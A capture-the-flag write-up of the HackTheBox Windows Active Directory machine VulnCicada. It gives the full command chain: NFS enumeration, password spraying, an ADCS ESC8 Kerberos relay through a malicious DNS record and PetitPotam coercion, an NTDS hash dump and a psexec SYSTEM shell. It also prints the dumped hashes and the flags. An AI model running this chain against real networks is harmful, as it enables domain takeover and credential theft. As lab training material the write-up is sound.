---
title: "HackTheBox - VulnCicada"
author: DrLi
description: "Writeup of a medium-rated Windows Active Directory machine from HackTheBox."
date: 2025-11-21 19:02:00 +0100
categories: [HackTheBox, Machines]
tags: [hackthebox, windows, medium, active directory, nfs, password-spray, adcs, esc8, kerberos-relay, coercion, certipy, krbrelayx, petitpotam, ntds-dump]
img_path: /assets/img/HackTheBox/Machines/VulnCicada
image:
    path: /assets/img/HackTheBox/Machines/VulnCicada/vulncicada.png
---

<div align="center"><script src="https://tryhackme.com/badge/2794771"></script></div>

---

[VulnCicada](https://www.vulnlab.com/) from [HackTheBox](https://www.vulnlab.com/) is a medium Windows Active Directory machine that begins with NFS enumeration to discover user profiles and a marketing image containing a potential password. Password spraying yields valid credentials for the user "Rosie.Powell". Privilege escalation leverages an ADCS ESC8 vulnerability where web enrollment is enabled over HTTP. Since NTLM authentication is disabled, we perform a Kerberos relay attack by adding a malicious DNS record and using PetitPotam coercion to force the Domain Controller to authenticate to our relay server. The relayed authentication allows us to request a certificate for the DC machine account, which is then used to dump the NTDS database and extract the Administrator hash for full domain compromise.

### Enumeration

## nmap

```bash
Nmap scan report for 10.129.234.48
Host is up (0.12s latency).
Not shown: 65511 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-21 13:33:47Z)
111/tcp   open  rpcbind?
|_rpcinfo: ERROR: Script execution failed (use -d to debug)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2025-11-21T13:15:09
|_Not valid after:  2026-11-21T13:15:09
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2025-11-21T13:15:09
|_Not valid after:  2026-11-21T13:15:09
|_ssl-date: TLS randomness does not represent time
2049/tcp  open  mountd        1-3 (RPC #100005)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2025-11-21T13:15:09
|_Not valid after:  2026-11-21T13:15:09
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2025-11-21T13:15:09
|_Not valid after:  2026-11-21T13:15:09
|_ssl-date: TLS randomness does not represent time
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Not valid before: 2025-11-20T13:22:46
|_Not valid after:  2026-05-22T13:22:46
|_ssl-date: 2025-11-21T13:35:16+00:00; +1s from scanner time.
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
62432/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
62435/tcp open  msrpc         Microsoft Windows RPC
62452/tcp open  msrpc         Microsoft Windows RPC
62513/tcp open  msrpc         Microsoft Windows RPC
62971/tcp open  msrpc         Microsoft Windows RPC
63210/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC-JPQ225; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-11-21T13:34:38
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

we have port 80 and 111 open

these normally are not present in a Domain Controller

so first let’s check the website

![image.png](/assets/img/HackTheBox/Machines/VulnCicada/image.png)

just the default IIS page

let’s move to NFS

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Vulncicada]
└─$ showmount -e cicada.vl         
Export list for cicada.vl:
/profiles (everyone)
```

let’s mount this and see what we can find inside

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Vulncicada]
└─$ sudo mkdir -p /mnt/cicada_profiles                                                                          
                                                                                                                    
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Vulncicada]
└─$ sudo mount -t nfs cicada.vl:/profiles /mnt/cicada_profiles

                                                                                                                    
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Vulncicada]
└─$ ls -la /mnt/cicada_profiles
total 14
drwxrwxrwx+ 2 nobody nogroup 4096 Jun  3 06:21 .
drwxr-xr-x  7 root   root    4096 Nov 21 08:48 ..
drwxrwxrwx+ 2 nobody nogroup   64 Sep 15  2024 Administrator
drwxrwxrwx+ 2 nobody nogroup   64 Sep 13  2024 Daniel.Marshall
drwxrwxrwx+ 2 nobody nogroup   64 Sep 13  2024 Debra.Wright
drwxrwxrwx+ 2 nobody nogroup   64 Sep 13  2024 Jane.Carter
drwxrwxrwx+ 2 nobody nogroup   64 Sep 13  2024 Jordan.Francis
drwxrwxrwx+ 2 nobody nogroup   64 Sep 13  2024 Joyce.Andrews
drwxrwxrwx+ 2 nobody nogroup   64 Sep 13  2024 Katie.Ward
drwxrwxrwx+ 2 nobody nogroup   64 Sep 13  2024 Megan.Simpson
drwxrwxrwx+ 2 nobody nogroup   64 Sep 13  2024 Richard.Gibbons
drwxrwxrwx+ 2 nobody nogroup   64 Sep 15  2024 Rosie.Powell
drwxrwxrwx+ 2 nobody nogroup   64 Sep 13  2024 Shirley.West
                                                                                                                    
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Vulncicada]
└─$ nano users.txt                            
                                                                                                                    
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Vulncicada]
└─$ tree -r /mnt/cicada_profiles
.
├── Shirley.West
├── Rosie.Powell
│   ├── marketing.png
│   └── Documents
│       ├── desktop.ini
│       └── $RECYCLE.BIN
│           └── desktop.ini
├── Richard.Gibbons
├── Megan.Simpson
├── Katie.Ward
├── Joyce.Andrews
├── Jordan.Francis
├── Jane.Carter
├── Debra.Wright
├── Daniel.Marshall
└── Administrator
    ├── vacation.png
    └── Documents
        ├── desktop.ini
        └── $RECYCLE.BIN
            └── desktop.ini

14 directories, 2 files
```

checking the picture inside Rosie directory we can find this

![image.png](/assets/img/HackTheBox/Machines/VulnCicada/image1.png)

in the yellow note we can find a potential password `Cicada123`

let’s spray this password across the users we identified from the NFS mount

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Vulncicada]
└─$ kerbrute passwordspray --dc DC-JPQ225.cicada.vl -d cicada.vl users.txt 'Cicada123'

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 11/21/25 - Ronnie Flathers @ropnop

2025/11/21 09:18:02 >  Using KDC(s):
2025/11/21 09:18:02 >   DC-JPQ225.cicada.vl:88

2025/11/21 09:18:02 >  [+] VALID LOGIN:  Rosie.Powell@cicada.vl:Cicada123
2025/11/21 09:18:02 >  Done! Tested 11 logins (1 successes) in 0.285 seconds
```

and the password works for Rosie 

### Privilege Escalation

now let’s enumerate and see what we can do

after a while of enumeration bloodhound did not show any routes to domain copromise

so i started enumerating ADCS

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Vulncicada]
└─$ certipy find -vulnerable -k -u Rosie.Powell@cicada.vl -p 'Cicada123' -dc-ip 10.129.234.48 -target DC-JPQ225.cicada.vl -stdout
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'cicada-DC-JPQ225-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'cicada-DC-JPQ225-CA'
[*] Checking web enrollment for CA 'cicada-DC-JPQ225-CA' @ 'DC-JPQ225.cicada.vl'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : cicada-DC-JPQ225-CA
    DNS Name                            : DC-JPQ225.cicada.vl
    Certificate Subject                 : CN=cicada-DC-JPQ225-CA, DC=cicada, DC=vl
    Certificate Serial Number           : 7DCFA0997830BFB04F2057C972EB4145
    Certificate Validity Start          : 2025-11-21 13:18:48+00:00
    Certificate Validity End            : 2525-11-21 13:28:48+00:00
    Web Enrollment
      HTTP
        Enabled                         : True
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : CICADA.VL\Administrators
      Access Rights
        ManageCa                        : CICADA.VL\Administrators
                                          CICADA.VL\Domain Admins
                                          CICADA.VL\Enterprise Admins
        ManageCertificates              : CICADA.VL\Administrators
                                          CICADA.VL\Domain Admins
                                          CICADA.VL\Enterprise Admins
        Enroll                          : CICADA.VL\Authenticated Users
    [!] Vulnerabilities
      ESC8                              : Web Enrollment is enabled over HTTP.
Certificate Templates                   : [!] Could not find any certificate templates
```

we have ESC8 

which includes web enrollment 

here is certipy documentation to understand the attack: https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc8-ntlm-relay-to-ad-cs-web-enrollment

if we  navigate to `http:///<server_name>/certsrv` 

we can confirm the web enrollment is enabled

![image.png](/assets/img/HackTheBox/Machines/VulnCicada/image2.png)

the attack include NTLM relaying and making the DC or a privileged user to connect to you 

the thing is NTLM authentication is disabled in this machine 

so we need to perform Kerberos relay instead

the attack can be performed in two ways

![image.png](/assets/img/HackTheBox/Machines/VulnCicada/image3.png)

i will use the DNS record method instead of creating a machine 

so first we need to add the malicious DNS record to our account 

here a blog to explain how the attack works: https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx.html

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Vulncicada]
└─$ bloodyAD -u Rosie.Powell -p Cicada123 -d cicada.vl -k --host DC-JPQ225.cicada.vl add dnsRecord DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA 10.10.14.115
[+] DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA has been successfully added
                                                                                                                    
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Vulncicada]
└─$ certipy relay -target 'http://dc-jpq225.cicada.vl/' -template DomainController
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Targeting http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp (ESC8)
[*] Listening on 0.0.0.0:445
[*] Setting up SMB Server on port 445
```

now we need to trigger a connection using Coerce_plus module in netexec

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Vulncicada]
└─$ nxc smb DC-JPQ225.cicada.vl  -u Rosie.Powell -p Cicada123 -k -M coerce_plus -o LISTENER=DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA METHOD=PetitPotam
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:Tru(SMBv1:False) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123 
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PetitPotam
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        Exploit Success, lsarpc\EfsRpcAddUsersToFile
```

and in the certipy relay server we get the DC cache

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Vulncicada]
└─$ certipy relay -target 'http://dc-jpq225.cicada.vl/' -template DomainController
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Targeting http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp (ESC8)
[*] Listening on 0.0.0.0:445
[*] Setting up SMB Server on port 445
[*] SMBD-Thread-2 (process_request_thread): Received connection from 10.129.234.48, attacking target http://dc-jpq225.cicada.vl
[*] HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 401 Unauthorized"
[*] HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 401 Unauthorized"
[*] HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 200 OK"
[*] Authenticating against http://dc-jpq225.cicada.vl as / SUCCEED
[*] Requesting certificate for '\\' based on the template 'DomainController'
[*] HTTP Request: POST http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 200 OK"
[*] SMBD-Thread-4 (process_request_thread): Received connection from 10.129.234.48, attacking target http://dc-jpq225.cicada.vl
[*] Certificate issued with request ID 89
[*] Retrieving certificate for request ID: 89
[*] HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certnew.cer?ReqID=89 "HTTP/1.1 200 OK"
[*] Got certificate with DNS Host Name 'DC-JPQ225.cicada.vl'
[*] Certificate object SID is 'S-1-5-21-687703393-1447795882-66098247-1000'
[*] Saving certificate and private key to 'dc-jpq225.pfx'
[*] Wrote certificate and private key to 'dc-jpq225.pfx'
[*] Exiting...
```

now we can dump the ntds.dit using netexec 

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Vulncicada]
└─$ export KRB5CCNAME=dc-jpq225.ccache 
                                                                                                                    
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Vulncicada]
└─$ nxc smb DC-JPQ225.cicada.vl --use-kcache --ntds                                            
[!] Dumping the ntds can crash the DC on Windows Server 2019. Use the option --user <user> to dump a specific user safely or the module -M ntdsutil [Y/n] y                                                                             
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] CICADA.VL\dc-jpq225$ from ccache 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        Administrator:500:aad3b435b51404eeaad3b435b51404ee:85a0da53871a9d56b6cd05deda3a5e87:::                                                                                          
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                                  
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8dd165a43fcb66d6a0e2924bb67e040c:::                                                                                                 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        cicada.vl\Shirley.West:1104:aad3b435b51404eeaad3b435b51404ee:ff99630bed1e3bfd90e6a193d603113f:::                                                                                
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        cicada.vl\Jordan.Francis:1105:aad3b435b51404eeaad3b435b51404ee:f5caf661b715c4e1435dfae92c2a65e3:::                                                                              
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        cicada.vl\Jane.Carter:1106:aad3b435b51404eeaad3b435b51404ee:7e133f348892d577014787cbc0206aba:::                                                                                 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        cicada.vl\Joyce.Andrews:1107:aad3b435b51404eeaad3b435b51404ee:584c796cd820a48be7d8498bc56b4237:::                                                                               
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        cicada.vl\Daniel.Marshall:1108:aad3b435b51404eeaad3b435b51404ee:8cdf5eeb0d101559fa4bf00923cdef81:::                                                                             
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        cicada.vl\Rosie.Powell:1109:aad3b435b51404eeaad3b435b51404ee:ff99630bed1e3bfd90e6a193d603113f:::                                                                                
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        cicada.vl\Megan.Simpson:1110:aad3b435b51404eeaad3b435b51404ee:6e63f30a8852d044debf94d73877076a:::                                                                               
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        cicada.vl\Katie.Ward:1111:aad3b435b51404eeaad3b435b51404ee:42f8890ec1d9b9c76a187eada81adf1e:::                                                                                  
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        cicada.vl\Richard.Gibbons:1112:aad3b435b51404eeaad3b435b51404ee:d278a9baf249d01b9437f0374bf2e32e:::                                                                             
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        cicada.vl\Debra.Wright:1113:aad3b435b51404eeaad3b435b51404ee:d9a2147edbface1666532c9b3acafaf3:::                                                                                
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        DC-JPQ225$:1000:aad3b435b51404eeaad3b435b51404ee:a65952c664e9cf5de60195626edbeee3:::                                                                                            
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] Dumped 14 NTDS hashes to /home/drli/.nxc/logs/ntds/DC-JPQ225_DC-JPQ225.cicada.vl_2025-11-21_110749.ntds of which 13 were added to the database
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*] To extract only enabled accounts from the output file, run the following command:
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*] cat /home/drli/.nxc/logs/ntds/DC-JPQ225_DC-JPQ225.cicada.vl_2025-11-21_110749.ntds | grep -iv disabled | cut -d ':' -f1
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*] grep -iv disabled /home/drli/.nxc/logs/ntds/DC-JPQ225_DC-JPQ225.cicada.vl_2025-11-21_110749.ntds | cut -d ':' -f1
```

using the admins hash we can authenticate to get the flags 

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Vulncicada]
└─$ impacket-getTGT -dc-ip 10.129.234.48 CICADA.VL/Administrator -hashes 85a0da53871a9d56b6cd05deda3a5e87      
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

not enough values to unpack (expected 2, got 1)
                                                                                                                                                
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Vulncicada]
└─$ impacket-getTGT -dc-ip 10.129.234.48 CICADA.VL/Administrator -hashes :85a0da53871a9d56b6cd05deda3a5e87
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Administrator.ccache
                                                                                                                                                
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Vulncicada]
└─$ export KRB5CCNAME=Administrator.ccache 

┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Vulncicada]
└─$ impacket-psexec -k -no-pass CICADA.VL/Administrator@DC-JPQ225.cicada.vl
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on DC-JPQ225.cicada.vl.....
[*] Found writable share ADMIN$
[*] Uploading file mOVphTYE.exe
[*] Opening SVCManager on DC-JPQ225.cicada.vl.....
[*] Creating service SGcr on DC-JPQ225.cicada.vl.....
[*] Starting service SGcr.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.2700]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> cd c:\users

c:\Users> dir
 Volume in drive C has no label.
 Volume Serial Number is D614-4931

 Directory of c:\Users

09/15/2024  05:26 AM    <DIR>          .
09/13/2024  08:10 AM    <DIR>          Administrator
09/13/2024  02:21 AM    <DIR>          Public
               0 File(s)              0 bytes
               3 Dir(s)   3,450,617,856 bytes free

c:\Users> cd Administrator
 
c:\Users\Administrator> dir
 Volume in drive C has no label.
 Volume Serial Number is D614-4931

 Directory of c:\Users\Administrator

09/13/2024  08:10 AM    <DIR>          .
09/15/2024  05:26 AM    <DIR>          ..
09/13/2024  02:21 AM    <DIR>          3D Objects
09/13/2024  02:21 AM    <DIR>          Contacts
04/10/2025  10:00 PM    <DIR>          Desktop
09/13/2024  02:21 AM    <DIR>          Downloads
09/13/2024  02:21 AM    <DIR>          Favorites
09/13/2024  02:21 AM    <DIR>          Links
09/13/2024  02:21 AM    <DIR>          Music
09/13/2024  02:21 AM    <DIR>          Pictures
09/13/2024  02:21 AM    <DIR>          Saved Games
09/13/2024  02:21 AM    <DIR>          Searches
09/13/2024  02:21 AM    <DIR>          Videos
               0 File(s)              0 bytes
              13 Dir(s)   3,450,617,856 bytes free

c:\Users\Administrator> cd Desktop
 
c:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is D614-4931

 Directory of c:\Users\Administrator\Desktop

04/10/2025  10:00 PM    <DIR>          .
09/13/2024  08:10 AM    <DIR>          ..
09/15/2024  05:26 AM             2,304 Microsoft Edge.lnk
11/21/2025  05:23 AM                34 root.txt
11/21/2025  05:23 AM                34 user.txt
               3 File(s)          2,372 bytes
               2 Dir(s)   3,450,617,856 bytes free

c:\Users\Administrator\Desktop> type user.txt
850be1c199e314e36e97f3e2d8934d7f

c:\Users\Administrator\Desktop> type root.txt
3fa16f23a0c350a8d852162c84d57eea
```

DONE!